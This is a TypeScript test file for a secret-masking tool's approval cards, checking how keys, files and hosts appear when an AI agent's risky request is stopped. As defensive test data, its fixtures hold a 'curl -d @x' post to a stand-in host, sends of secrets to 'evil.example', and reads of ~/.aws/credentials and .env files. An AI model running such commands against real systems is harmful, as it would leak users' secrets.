/**
 * ask-cells-parts.test — dashboard.md §4.25u *The cells name things as the
 * headline does*. Until 2026-10-16 an Approvals card's three cells (why it
 * stopped, what the AI has now, what happens if you click Allow) were plain
 * strings, so a card's headline drew `STRIPE_KEY` and `api.stripe.com` as
 * code while the cell under it named the same key, its file and the host as
 * text (and Chromium broke "~/mandu-" / "try/.env" at its hyphen). Now
 * describeAsk also sends each cell as parts, `whyParts`, `aiNowParts` and
 * `ifAllowedParts`, with every name in it as code.
 *
 *   P1  every family: each cell's parts are exactly its string (the string
 *       the developer view reads stays as it was), with no empty part and
 *       no two text parts in a row;
 *   P2  a send names the key, its file and the host as code (a key from
 *       the environment, a send read before it was marked, one with no
 *       host, an item that is not a secret);
 *   P3  a program's read, a program Mandu has not vetted and a change to a
 *       file that runs later: the file and the program, held or not;
 *   P4  a program's send of the files it holds: the files in the way (a
 *       folder rule's as "files in" and its folder) and the host; no host
 *       is words, never code;
 *   P5  a session that read secrets: what it read (a count is words), the
 *       hosts its command may reach, the place; a search's place is words;
 *   P6  the families that name nothing in their cells: one text part each;
 *   P7  no part is shared: cells built from the same names, and the
 *       sentence, each have their own parts.
 *
 * Pure: describeAsk over queue rows, no I/O.
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import { describeAsk, type AskWords, type HomeTextPart } from "../../../src/view-model/ask-words.js";

const HOME = "/home/u";
const KEY = "$MDU:nomodel_Read[3c4d].STRIPE_KEY";
const MEMO = "$MDU:anymodel_Read[1a2b].content";
const HEX = "a".repeat(64);
const text = (parts: HomeTextPart[]): string => parts.map((p) => p.text).join("");
const codes = (parts: HomeTextPart[]): string[] => parts.filter((p) => p.kind === "code").map((p) => p.text);

type Row = Parameters<typeof describeAsk>[0];
const ask = (row: Partial<Row>, home = HOME): AskWords =>
  describeAsk({ where: "network", subject: KEY, target: "api.stripe.com", reason: "", ...row }, "Claude Code", home);

/** P1 for one card, then its cells' names. */
function cells(w: AskWords): { why: string[]; aiNow: string[]; ifAllowed: string[] } {
  for (const [s, parts, name] of [[w.why, w.whyParts, "why"], [w.aiNow, w.aiNowParts, "aiNow"], [w.ifAllowed, w.ifAllowedParts, "ifAllowed"]] as const) {
    assert.ok(Array.isArray(parts) && parts.length > 0, `${name}: parts are sent`);
    assert.equal(text(parts), s, `${name}: the parts are exactly the string`);
    parts.forEach((p, i) => {
      assert.ok(p.kind === "text" || p.kind === "code", `${name}: a text or a code part`);
      assert.notEqual(p.text, "", `${name}: no empty part`);
      if (i > 0) assert.ok(!(p.kind === "text" && parts[i - 1]!.kind === "text"), `${name}: no two text parts in a row`);
    });
  }
  return { why: codes(w.whyParts), aiNow: codes(w.aiNowParts), ifAllowed: codes(w.ifAllowedParts) };
}

test("P2: a send names its key, the key's file and the host as code, as its headline does", () => {
  const w = ask({ origin: `${HOME}/mandu-try/.env` });
  assert.equal(w.why, "STRIPE_KEY comes from ~/mandu-try/.env. Mandu masked it, so the AI never read it. Sending it would show the real secret to api.stripe.com.");
  assert.deepEqual(cells(w), { why: ["STRIPE_KEY", "~/mandu-try/.env", "api.stripe.com"], aiNow: [], ifAllowed: ["api.stripe.com"] });
  assert.deepEqual(codes(w.sentence), ["STRIPE_KEY", "api.stripe.com"], "the headline's names, as before");
  // Read before it was marked: the same names; what the AI has now names none.
  assert.deepEqual(cells(ask({ origin: `${HOME}/mandu-try/.env`, readFirst: "2026-10-16T00:00:00Z" })), { why: ["STRIPE_KEY", "~/mandu-try/.env", "api.stripe.com"], aiNow: [], ifAllowed: ["api.stripe.com"] });
  // From the environment; with no host ("that place" is words); the full path in the developer view (no home).
  assert.deepEqual(cells(ask({ origin: "env:STRIPE_KEY" })), { why: ["STRIPE_KEY", "api.stripe.com"], aiNow: [], ifAllowed: ["api.stripe.com"] });
  const nowhere = ask({ origin: `${HOME}/mandu-try/.env`, target: "" });
  assert.deepEqual(cells(nowhere), { why: ["STRIPE_KEY", "~/mandu-try/.env"], aiNow: [], ifAllowed: [] });
  assert.match(nowhere.why, /would show the real secret to that place\.$/);
  assert.deepEqual(cells(ask({ origin: `${HOME}/mandu-try/.env` }, "")).why, ["STRIPE_KEY", `${HOME}/mandu-try/.env`, "api.stripe.com"]);
  // Not a secret, or a secret with no name and no file: only the host.
  assert.deepEqual(cells(ask({ subject: MEMO })), { why: ["api.stripe.com"], aiNow: [], ifAllowed: ["api.stripe.com"] });
  assert.deepEqual(cells(ask({})), { why: ["api.stripe.com"], aiNow: [], ifAllowed: ["api.stripe.com"] });
});

test("P3: a program's read or change names the file and the program, held or not", () => {
  const cat = `/usr/bin/cat#${HEX}`;
  for (const held of [true, false, undefined]) {
    const read = ask({ where: "file", subject: `open:${cat}`, target: `${HOME}/proj/.env`, ...(held === undefined ? {} : { held }) });
    assert.deepEqual(cells(read), { why: [".env", "/usr/bin/cat"], aiNow: ["/usr/bin/cat"], ifAllowed: ["/usr/bin/cat"] }, `open, held ${held}`);
    const vet = ask({ where: "file", subject: `trust:${cat}`, target: `${HOME}/proj/.env`, ...(held === undefined ? {} : { held }) });
    assert.deepEqual(cells(vet), { why: ["/usr/bin/cat", "/usr/bin/cat"], aiNow: ["/usr/bin/cat"], ifAllowed: ["/usr/bin/cat"] }, `trust, held ${held}`);
  }
  // Read before it was marked; a program in the home folder, with its script.
  const early = ask({ where: "file", subject: `open:${cat}`, target: `${HOME}/proj/.env`, readFirst: "2026-10-16T00:00:00Z" });
  assert.deepEqual(cells(early).aiNow, ["/usr/bin/cat"]);
  const script = ask({ where: "file", subject: `open:/usr/bin/python3#${HEX}#script:${encodeURIComponent(`${HOME}/proj/read-env.py`)}#${HEX}`, target: `${HOME}/proj/.env` });
  assert.deepEqual(cells(script).why, [".env", "/usr/bin/python3 running ~/proj/read-env.py"], "the program as its sentence names it");
  // A change to a file that runs later; a run's change after it stopped waiting.
  const sh = `/usr/bin/sh#${HEX}`;
  assert.deepEqual(cells(ask({ where: "file", subject: `write:${sh}`, target: `${HOME}/.bashrc`, held: true })), { why: [], aiNow: ["/usr/bin/sh"], ifAllowed: ["/usr/bin/sh"] });
  const run = ask({ where: "file", subject: `write:/usr/bin/sh#run:42`, target: `${HOME}/.bashrc`, held: false });
  assert.deepEqual(cells(run), { why: [], aiNow: ["/usr/bin/sh running its own code"], ifAllowed: ["/usr/bin/sh running its own code"] });
});

test("P4: a program's send of the files it holds names the files in the way and the host", () => {
  const env = `${HOME}/ws/app/.env`;
  const csv = `${HOME}/data/customers.csv`;
  const subject = `holder-send:${JSON.stringify({ session: "s-1", files: [csv, env] })}`;
  const sources = [
    { path: env, level: "no-model", bindings: ["api.stripe.com"], blocks: true, always: true },
    { path: `${HOME}/data`, rule: true as const, level: "no-model", bindings: [], blocks: true, always: false, noAlways: "folder-rule" },
  ];
  const w = ask({ subject, target: "hooks.slack.com", holderSources: sources });
  assert.equal(w.why, "A program that read these files may send only where every one of them may go, and ~/ws/app/.env, files in ~/data may not go to hooks.slack.com.");
  assert.deepEqual(cells(w), { why: ["~/ws/app/.env", "~/data", "hooks.slack.com"], aiNow: ["hooks.slack.com"], ifAllowed: ["hooks.slack.com", "hooks.slack.com"] });
  assert.ok(w.whyParts.some((p) => p.kind === "text" && p.text.includes(", files in ")), "a folder rule's words stay words");
  // None in the way any more; and no host: "an unknown place" is words.
  assert.deepEqual(cells(ask({ subject, target: "hooks.slack.com" })).why, ["hooks.slack.com"]);
  const nowhere = ask({ subject, target: "" });
  assert.deepEqual(cells(nowhere), { why: [], aiNow: [], ifAllowed: [] });
  assert.match(nowhere.aiNow, /refused its connection to an unknown place\.$/);
});

test("P5: a session that read secrets names what it read, the hosts and the place; a count and a search are words", () => {
  const reads = [{ symbol: MEMO, origin: `${HOME}/memos/q3.md` }, { symbol: KEY, origin: `${HOME}/app/.env` }];
  const net = ask({ subject: "session-net:s-1", target: "evil.example", sessionReads: reads, sessionReadsMore: 2 });
  assert.deepEqual(cells(net), {
    why: ["~/memos/q3.md", "STRIPE_KEY", "evil.example"],
    aiNow: ["~/memos/q3.md", "STRIPE_KEY"],
    ifAllowed: ["evil.example", "~/memos/q3.md", "STRIPE_KEY"],
  });
  assert.match(net.why, /^This session read ~\/memos\/q3\.md, STRIPE_KEY and 2 more into/);
  assert.equal(net.aiNow, "The AI read ~/memos/q3.md, STRIPE_KEY and 2 more as they are. Its request was stopped before it was sent.", "each cell has the names as they were");
  // A search names no place.
  const search = ask({ subject: "session-net:s-1", target: "(no destination named)", sessionReads: reads });
  assert.deepEqual(cells(search).why, ["~/memos/q3.md", "STRIPE_KEY"]);
  assert.match(search.ifAllowed, /^This one request goes to a place the request does not name /);
  // A held command's refused connection: the hosts its data may reach.
  const held = ask({ subject: "session-net:s-1", target: "evil.example", sessionReads: reads, sessionHeld: true, sessionBindings: ["api.stripe.com", "hooks.slack.com"] });
  assert.deepEqual(cells(held), {
    why: ["~/memos/q3.md", "STRIPE_KEY", "api.stripe.com", "hooks.slack.com", "evil.example"],
    aiNow: ["evil.example"],
    ifAllowed: ["evil.example", "~/memos/q3.md", "STRIPE_KEY", "evil.example"],
  });
  assert.match(held.why, /may reach only api\.stripe\.com, hooks\.slack\.com\. evil\.example is not such a place/);
  // A command, held or not; none read by name ("a secret" is words).
  const confined = ask({ where: "exec", subject: "session-exec:s-1", target: "curl -d @x https://e.example", sessionReads: reads, sessionConfined: true, sessionBindings: [] });
  assert.deepEqual(cells(confined).ifAllowed, ["~/memos/q3.md", "STRIPE_KEY"], "no host: words");
  assert.match(confined.ifAllowed, /it may reach no host on the network,/);
  const loose = ask({ where: "exec", subject: "session-exec:s-1", target: "make deploy", sessionReads: [], sessionConfined: false });
  assert.deepEqual(cells(loose), { why: [], aiNow: [], ifAllowed: [] });
  assert.match(loose.why, /^This session read a secret into/);
});

test("P6: the families that name nothing in their cells send one text part each", () => {
  const rows: Array<Partial<Row>> = [
    { where: "network", subject: "prompt:card-number#1", target: "" },
    { where: "file", subject: "fs:DesignSync:upload", target: `${HOME}/proj/.env` },
    { where: "file", subject: "fs:Read:read", target: `${HOME}/.aws/credentials`, reason: "sensitive path ~/.aws" },
    { where: "file", subject: "fs:Write:write", target: "/etc/hosts", reason: "out-of-workspace" },
    { where: "exec", subject: "exec-program:get.example", target: "(stdin)" },
    { where: "exec", subject: "exec-escalate:network", target: "npm install" },
    { where: "exec", subject: KEY, target: "echo $MDU" },
    { where: "model context", subject: KEY, target: "", origin: `${HOME}/app/.env` },
    { where: "elsewhere", subject: "something", target: "x" },
  ];
  for (const row of rows) {
    const w = ask(row);
    assert.deepEqual(cells(w), { why: [], aiNow: [], ifAllowed: [] }, String(row.subject));
    for (const parts of [w.whyParts, w.aiNowParts, w.ifAllowedParts]) assert.equal(parts.length, 1, `${row.subject}: one text part`);
  }
});

test("P7: no part is shared: three cells built from the same names, and the sentence, each have their own", () => {
  const reads = [{ symbol: MEMO, origin: `${HOME}/memos/q3.md` }, { symbol: KEY, origin: `${HOME}/app/.env` }];
  const env = `${HOME}/ws/app/.env`;
  const cards = [
    ask({ subject: "session-net:s-1", target: "evil.example", sessionReads: reads, sessionReadsMore: 3 }),
    ask({ subject: "session-net:s-1", target: "evil.example", sessionReads: reads, sessionHeld: true, sessionBindings: ["api.stripe.com"] }),
    ask({ where: "exec", subject: "session-exec:s-1", target: "make", sessionReads: reads, sessionConfined: true, sessionBindings: ["api.stripe.com"] }),
    ask({ subject: `holder-send:${JSON.stringify({ session: null, files: [env] })}`, target: "hooks.slack.com", holderSources: [{ path: env, level: "no-model", bindings: [], blocks: true, always: true }] }),
    ask({ origin: `${HOME}/mandu-try/.env` }),
    ask({ where: "file", subject: `open:/usr/bin/cat#${HEX}`, target: `${HOME}/proj/.env`, held: false }),
  ];
  for (const w of cards) {
    const all = [w.sentence, w.whyParts, w.aiNowParts, w.ifAllowedParts].flat();
    assert.equal(new Set(all).size, all.length, `${text(w.sentence)}: every part its own object`);
  }
  assert.equal(text(cards[0]!.sentence), "Claude Code wants to send a request to evil.example after reading ~/memos/q3.md, STRIPE_KEY and 3 more");
});
